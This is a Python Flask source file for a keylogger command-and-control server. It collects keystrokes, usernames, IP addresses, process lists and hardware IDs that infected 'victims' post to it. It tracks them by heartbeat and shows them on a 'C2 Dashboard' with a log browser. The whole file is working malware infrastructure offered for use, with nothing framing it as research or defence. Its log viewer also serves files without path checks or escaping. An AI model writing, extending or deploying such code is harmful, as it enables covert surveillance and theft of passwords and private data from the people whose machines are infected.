from flask import Flask, request
import os
import datetime

app = Flask(__name__)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

victims = {}  # hwid -> dict with info
HEARTBEAT_TIMEOUT = 60  # seconds before marking a victim as dead

@app.route("/log", methods=["POST"])
def receive_log():
    keystrokes = request.form.get("k", "")
    hostname = request.form.get("hostname", "unknown")
    hwid = request.form.get("hwid", "unknown")
    client_ip = request.remote_addr

    now = datetime.datetime.now().isoformat(timespec="seconds")
    now_ts = datetime.datetime.now().timestamp()

    # --- Per-client log file path ---
    safe_name = hostname.replace(" ", "_").replace("/", "_")
    client_log = os.path.join(LOG_DIR, f"{safe_name}_{hwid}.log")
    is_new_client = not os.path.exists(client_log)

    # --- If first contact, write system info header at top of file ---
    is_first_contact = request.form.get("first_contact") == "1"

    if is_new_client or is_first_contact:
        header_lines = [
            f"{'='*60}",
            f"VICTIM: {hostname}",
            f"HWID:   {hwid}",
            f"IP:     {client_ip}",
            f"FIRST SEEN: {now}",
        ]
        if is_first_contact:
            header_lines += [
                f"OS:     {request.form.get('os', 'unknown')}",
                f"ARCH:   {request.form.get('arch', 'unknown')}",
                f"USER:   {request.form.get('username', 'unknown')}",
                f"LOCAL IP: {request.form.get('local_ip', 'unknown')}",
                f"PUBLIC IP: {request.form.get('public_ip', 'unknown')}",
                f"PROCESSES: {request.form.get('processes', 'unknown')}",
            ]
        header_lines.append(f"{'='*60}\n")

        with open(client_log, "w") as f:
            f.write("\n".join(header_lines))

    # --- Unified log with identity ---
    line = f"[{now}] [{hostname}] [{hwid}] ({client_ip}) {keystrokes}"
    print(line)

    with open(os.path.join(LOG_DIR, "all_clients.log"), "a") as f:
        f.write(line + "\n")

    # --- Append keystrokes to per-client log ---
    with open(client_log, "a") as f:
        f.write(f"[{now}] {keystrokes}\n")

    # --- In-memory victim tracking ---
    if hwid not in victims:
        victims[hwid] = {
            "hostname": hostname,
            "ip": client_ip,
            "first_seen": now,
            "last_seen": now,
            "last_seen_ts": now_ts,
            "total_keys": 0,
            "alive": True,
        }
    victims[hwid]["last_seen"] = now
    victims[hwid]["last_seen_ts"] = now_ts
    victims[hwid]["total_keys"] += len(keystrokes)
    victims[hwid]["ip"] = client_ip

    return "OK", 200

@app.route("/ping", methods=["POST"])
def heartbeat():
    """Lightweight ping endpoint — victims call this even without keystrokes."""
    hwid = request.form.get("hwid", "unknown")
    hostname = request.form.get("hostname", "unknown")
    client_ip = request.remote_addr
    now = datetime.datetime.now().isoformat(timespec="seconds")
    now_ts = datetime.datetime.now().timestamp()

    if hwid not in victims:
        victims[hwid] = {
            "hostname": hostname,
            "ip": client_ip,
            "first_seen": now,
            "last_seen": now,
            "last_seen_ts": now_ts,
            "total_keys": 0,
            "alive": True,
        }
    else:
        victims[hwid]["last_seen"] = now
        victims[hwid]["last_seen_ts"] = now_ts
        victims[hwid]["ip"] = client_ip
        victims[hwid]["alive"] = True

    return "PONG", 200

def is_victim_alive(last_seen_ts):
    """Check if victim has checked in within the timeout window."""
    return (datetime.datetime.now().timestamp() - last_seen_ts) < HEARTBEAT_TIMEOUT

@app.route("/clients", methods=["GET"])
def list_clients():
    """HTML dashboard of connected victims with alive/dead status."""
    # Update alive status for all victims
    for hwid, info in victims.items():
        info["alive"] = is_victim_alive(info["last_seen_ts"])

    rows = ""
    for hwid, info in sorted(victims.items(), key=lambda x: x[1]["last_seen"], reverse=True):
        status = "🟢 Alive" if info["alive"] else "🔴 Dead"
        status_color = "#00aa00" if info["alive"] else "#aa0000"
        rows += (
            f"<tr>"
            f"<td>{info['hostname']}</td>"
            f"<td><code>{hwid}</code></td>"
            f"<td>{info['ip']}</td>"
            f"<td style='color: {status_color}; font-weight: bold;'>{status}</td>"
            f"<td>{info['last_seen']}</td>"
            f"<td>{info['first_seen']}</td>"
            f"<td>{info['total_keys']}</td>"
            f"</tr>"
        )

    return f"""<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard — Active Victims</title>
    <meta http-equiv="refresh" content="15">
    <style>
        body {{ font-family: monospace; padding: 2rem; }}
        table {{ border-collapse: collapse; }}
        td, th {{ padding: 8px 16px; border: 1px solid #ccc; }}
        th {{ background: #f0f0f0; }}
        tr:hover {{ background: #f8f8f8; }}
    </style>
</head>
<body>
    <h2>Victims Dashboard <span style="font-size: 0.8rem; color: #888;">(auto-refreshes every 15s)</span></h2>
    <table>
        <thead>
            <tr>
                <th>Hostname</th>
                <th>HWID</th>
                <th>IP</th>
                <th>Status</th>
                <th>Last Seen</th>
                <th>First Seen</th>
                <th>Keys Captured</th>
            </tr>
        </thead>
        <tbody>{rows}</tbody>
    </table>
    <p><a href="/logs">Browse log files</a></p>
</body>
</html>"""

@app.route("/logs", methods=["GET"])
def list_logs():
    """List all per-victim log files."""
    files = sorted(os.listdir(LOG_DIR))
    items = "".join(
        f"<li><a href='/view/{f}'>{f}</a></li>" for f in files if f.endswith(".log")
    )
    return f"""<!DOCTYPE html>
<html>
<head><title>C2 Dashboard — Log Files</title>
    <style>
        body {{ font-family: monospace; padding: 2rem; }}
        li {{ margin: 6px 0; }}
    </style>
</head>
<body>
    <h2>Log Files</h2>
    <ul>{items}</ul>
    <p><a href="/clients">← Back to victims</a></p>
</body>
</html>"""

@app.route("/view/<path:filename>", methods=["GET"])
def view_log(filename):
    """Serve a raw log file for reading."""
    path = os.path.join(LOG_DIR, filename)
    if not os.path.exists(path):
        return "Not found", 404
    with open(path) as f:
        content = f.read()
    return f"<pre style='font-size: 0.9rem;'>{content}</pre>", 200, {"Content-Type": "text/html; charset=utf-8"}

app.run(host="0.0.0.0", port=8443, ssl_context="adhoc")